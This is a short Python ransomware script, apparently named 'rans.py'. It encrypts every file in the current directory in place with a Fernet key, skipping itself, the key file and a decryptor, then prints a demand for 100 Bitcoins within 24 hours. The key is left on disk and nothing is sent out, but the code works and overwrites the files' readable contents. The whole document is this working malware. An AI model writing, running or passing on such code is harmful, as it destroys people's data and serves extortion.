#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's find some files
files = []

# Loop through the files in the current directory
for file in os.listdir():
    if file == "rans.py" or file == "mykey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

# Generate a key for encryption
key = Fernet.generate_key()

# Save the key to a file
with open("mykey.key", "wb") as mykey:
    mykey.write(key)

# Encrypt all the files found earlier
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("You have been hacked!!! Send me 100 Bitcoins in 24 Hours")
